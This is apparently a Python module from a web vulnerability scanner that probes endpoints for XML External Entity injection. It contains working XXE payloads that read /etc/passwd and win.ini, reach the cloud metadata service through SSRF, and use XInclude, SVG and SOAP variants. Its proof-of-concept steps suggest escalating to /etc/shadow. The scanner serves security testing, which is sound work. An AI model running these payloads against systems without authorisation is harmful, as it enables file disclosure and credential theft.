"""XXE Scanner — detects XML External Entity injection vulnerabilities."""
from __future__ import annotations
import asyncio
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# XXE payloads targeting different parsers
XXE_PAYLOADS = [
    # Basic file read
    {
        "name": "basic_file_read",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "signatures": ["root:x:0", "root:x:0:0"],
    },
    # Windows file read
    {
        "name": "windows_file_read",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "signatures": ["[fonts]", "[extensions]", "for 16-bit"],
    },
    # Parameter entity
    {
        "name": "parameter_entity",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><root>test</root>',
        "signatures": [],
    },
    # SSRF via XXE
    {
        "name": "ssrf_via_xxe",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "signatures": ["ami-id", "instance-id", "instance-type"],
    },
    # XInclude
    {
        "name": "xinclude",
        "body": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        "signatures": ["root:x:0"],
    },
    # SVG XXE
    {
        "name": "svg_xxe",
        "body": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        "signatures": ["root:x:0"],
    },
    # SOAP XXE
    {
        "name": "soap_xxe",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>""",
        "signatures": ["root:x:0"],
    },
    # Billion laughs (detection only — limited)
    {
        "name": "billion_laughs_detect",
        "body": '<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><root>&lol3;</root>',
        "signatures": [],  # Check for timeout/error
    },
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "image/svg+xml",
]


class XXEScanner(BaseScanner):
    name = "xxe_scanner"
    description = "Detects XML External Entity (XXE) injection vulnerabilities"
    tags = ["xxe", "injection", "owasp-a05"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        tasks = []

        # Find XML-accepting endpoints
        for url, params in state.target.discovered_params.items():
            tasks.append(self._test_endpoint(url, params))

        # Also test common XML endpoints
        common_xml_paths = [
            "/api/xml", "/soap", "/wsdl", "/xmlrpc.php", "/api/upload",
            "/api/import", "/api/parse", "/feed", "/rss", "/sitemap.xml",
        ]
        from urllib.parse import urljoin
        for path in common_xml_paths:
            full_url = urljoin(state.target.url, path)
            tasks.append(self._test_xml_endpoint(full_url))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
            elif isinstance(r, Finding):
                findings.append(r)

        return findings

    async def _test_endpoint(self, url: str, params: list) -> List[Finding]:
        """Test if an endpoint accepts XML and is vulnerable.

        Two approaches:
        1. Send raw XML body to the URL (for XML-accepting endpoints)
        2. Inject XML payloads into individual parameters (for form/query endpoints)
        """
        findings = []

        # Approach 1: raw XML body
        for payload_info in XXE_PAYLOADS:
            try:
                resp, raw_req = await self.client.post(
                    url,
                    content=payload_info["body"],
                    extra_headers={"Content-Type": "application/xml"},
                )
                if not resp:
                    continue

                finding = self._check_response(resp, raw_req, url, payload_info)
                if finding:
                    findings.append(finding)
                    break  # One confirmed XXE is enough per endpoint
            except Exception as exc:
                self.logger.debug(f"XXE test error for {url}: {exc}")
                continue

        # Approach 2: inject XML into individual parameters
        if not findings and params:
            for param in params:
                for payload_info in XXE_PAYLOADS[:3]:  # Limit to top 3 payloads per param
                    try:
                        resp, raw_req = await self.test_payload(
                            url, "POST", param, payload_info["body"],
                            inject_in="body",
                        )
                        if not resp:
                            continue
                        finding = self._check_response(resp, raw_req, url, payload_info)
                        if finding:
                            finding.parameter = param
                            findings.append(finding)
                            break  # One per param is enough
                    except Exception as exc:
                        self.logger.debug(f"XXE param test error for {url}/{param}: {exc}")
                        continue

        return findings

    async def _test_xml_endpoint(self, url: str) -> Finding | None:
        """Test a specific URL that might accept XML."""
        for payload_info in XXE_PAYLOADS[:3]:  # Test first 3 payloads only
            try:
                resp, raw_req = await self.client.post(
                    url,
                    content=payload_info["body"],
                    extra_headers={"Content-Type": "application/xml"},
                )
                if not resp:
                    continue
                if resp.status_code in (404, 405, 403):
                    return None  # Endpoint doesn't exist or doesn't accept POST

                finding = self._check_response(resp, raw_req, url, payload_info)
                if finding:
                    return finding
            except Exception as exc:
                self.logger.debug(f"XXE endpoint test error for {url}: {exc}")
                continue
        return None

    def _check_response(self, resp, raw_req, url, payload_info) -> Finding | None:
        """Check if XXE payload was successful."""
        body = resp.text

        # Check for file content signatures
        for sig in payload_info["signatures"]:
            if sig.lower() in body.lower():
                severity = Severity.CRITICAL
                if payload_info["name"] == "ssrf_via_xxe":
                    title = "SSRF via XXE — Cloud Metadata Exposed"
                    vuln_type = "xxe_ssrf"
                elif "file_read" in payload_info["name"]:
                    title = f"XXE File Read ({payload_info['name']})"
                    vuln_type = "xxe_file_read"
                else:
                    title = f"XXE Injection ({payload_info['name']})"
                    vuln_type = "xxe"

                return self.make_finding(
                    title=title,
                    vuln_type=vuln_type,
                    severity=severity,
                    url=url,
                    method="POST",
                    payload=payload_info["body"][:200],
                    evidence=f"Signature '{sig}' found in response: {body[:300]}",
                    request=raw_req,
                    response=body[:500],
                    cwe_id="CWE-611",
                    owasp_category="A05:2021 - Security Misconfiguration",
                    description=(
                        f"XML parser processes external entities. Payload '{payload_info['name']}' "
                        f"extracted server-side file content. This can lead to full file system read, "
                        f"SSRF, and potentially RCE."
                    ),
                    poc_steps=[
                        f"1. Send XML payload to {url} with Content-Type: application/xml",
                        f"2. Include external entity definition in DOCTYPE",
                        f"3. Reference entity in XML body",
                        f"4. Observe extracted file content in response: {sig}",
                        "5. Escalate: read /etc/shadow, config files, or access internal services",
                    ],
                )

        # Check for XML parsing errors (indicates parser is processing XML)
        error_patterns = [
            "xml parsing error", "xml syntax", "invalid xml",
            "entityref", "unterminated entity", "parser error",
        ]
        if any(p in body.lower() for p in error_patterns):
            return self.make_finding(
                title=f"XML Parser Detected (potential blind XXE)",
                vuln_type="xxe_parser_detected",
                severity=Severity.LOW,
                url=url,
                method="POST",
                payload=payload_info["body"][:200],
                evidence=f"XML parser error in response (blind XXE may be possible)",
                request=raw_req,
                cwe_id="CWE-611",
                owasp_category="A05:2021 - Security Misconfiguration",
            )

        return None
